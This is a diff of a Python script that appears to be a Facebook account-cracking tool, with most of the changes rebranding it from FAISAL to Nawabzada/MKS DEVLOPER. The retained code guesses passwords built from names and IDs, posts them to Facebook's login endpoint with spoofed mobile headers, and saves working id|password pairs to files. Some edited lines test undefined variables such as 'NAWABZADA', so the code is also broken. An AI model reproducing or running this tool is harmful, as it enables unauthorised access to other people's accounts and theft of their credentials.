@@ -168,18 +168,19 @@ syed =[
 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',]
 logo=("""\033[1;97m
-  ______      _____  _____         _      
- |  ____/\   |_   _|/ ____|  /\   | |     
- | |__ /  \    | | | (___   /  \  | |     
- |  __/ /\ \   | |  \___ \ / /\ \ | |     
- | | / ____ \ _| |_ ____) / ____ \| |____ 
- |_|/_/    \_\_____|_____/_/    \_\______|
+ 
+╭━╮╱╭┳━━━┳╮╭╮╭┳━━━┳━━╮
+┃┃╰╮┃┃╭━╮┃┃┃┃┃┃╭━╮┃╭╮┃
+┃╭╮╰╯┃┃╱┃┃┃┃┃┃┃┃╱┃┃╰╯╰╮
+┃┃╰╮┃┃╰━╯┃╰╯╰╯┃╰━╯┃╭━╮┃
+┃┃╱┃┃┃╭━╮┣╮╭╮╭┫╭━╮┃╰━╯┃
+╰╯╱╰━┻╯╱╰╯╰╯╰╯╰╯╱╰┻━━━╯
                         
 --------------------------------------------------
->>  Owner    : ITX FAISAL
->>  Facebook : FAISL KHAN
->>  Version  : 0.3
->>  Team❤    : ALONE
+>>  Owner    : ITX NawabZada
+>>  Facebook : NawabZadakhan
+>>  Version  : 0.4
+>>  Team❤    : MKS DEVLOPER 
 --------------------------------------------------""")
 def linex():
 	print('\033[1;37m--------------------------------------------------')
@@ -193,7 +194,7 @@ pcp=[]
 id=[]
 def fia():    
 			print(logo)
-			print('\x1b[1;91m>>> FAISAL TEAM  VERSION :\x1b[1;92m 1.1 ')
+			print('\x1b[1;91m>>> MKS Devloper TEAM  VERSION :\x1b[1;92m 1.1 ')
 			linex()
 			print('[1] Crack File Clone\n[2] Crack Pak Random Clone\n[0] Exit')
 			linex()
@@ -201,7 +202,7 @@ def fia():
 			if xd in ['1','01']:
 				os.system('clear')
 				print(logo)
-				print('Example : /sdcard/FAISAL.txt')
+				print('Example : /sdcard/Nawabzada.txt')
 				linex()
 				file = input(' Put file path\033[1;37m: ')
 				try:
@@ -257,13 +258,13 @@ def fia():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python FAISAL.py')
+				os.system('python Nawabzada.py')
 			elif xd in ['2','02']:
 				menu()
 			elif xd in ['3','03']:
 				bd()
 			elif xd in ['4','04']:
-				os.system(f'xdg-open https://www.facebook.com/meHraNAno40');menu()
+				os.system(f'xdg-open ');menu()
 			elif xd in ['0','00']:
 				exit()
 			else:
@@ -271,7 +272,7 @@ def fia():
 		
 def mmm(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m[FAISAL / NAZIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m[MKS Devloper / Nawabzada] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -291,17 +292,17 @@ def mmm(ids,names,passlist):
 			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			SHAHBAZ=session.cookies.get_dict().keys()
-			if "c_user" in SHAHBAZ:
-				print('\r\r\033[1;31m[FAISAL-CP] %s | %s'%(ids,pas))
+			if "c_user" in NAWABZADA:
+				print('\r\r\033[1;31m[Nawabzada-CP] %s | %s'%(ids,pas))
 				
-				open('/sdcard/FAISAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+				open('/sdcard/Nawabzada-CP.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in SHAHBAZ:
+			elif 'checkpoint' in MKSdevloper:
 				if 'y' in pcp:
-					print('\r\r\x1b[1;92m[FAISAL-OK] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[1;92m[Nawabzada-OK] '+ids+' | '+pas+'\033[1;97m')
 					
-					open('/sdcard/FAISAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+					open('/sdcard/Nawabzada-OK.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -313,7 +314,7 @@ def mmm(ids,names,passlist):
 	loop+=1
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m[FAISAL / NAZIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m[MKSDEVLOPER / Nawabzada] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -340,11 +341,11 @@ def ffb(ids,names,passlist):
 				open('/sdcard/FAISAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in SHAHBAZ:
+			elif 'checkpoint' in MKSdevloper:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;208m[FAISAL-CP] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[38;5;208m[Nawabzada-CP] '+ids+' | '+pas+'\033[1;97m')
 					
-					open('/sdcard/FAISAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					open('/sdcard/Nawabzada-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -547,14 +548,14 @@ def fcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[38;5;208m[FAISAL-CP] '+cid+' | '+ps+'\033[1;32m')
+				print('\33[38;5;208m[Nawabzada-CP] '+cid+' | '+ps+'\033[1;32m')
 				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\x1b[1;92m[FAISAL-OK] '+cid+' | '+ps+'\33[0;97m')
+				print('\x1b[1;92m[Nawabzada-OK] '+cid+' | '+ps+'\33[0;97m')
 				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
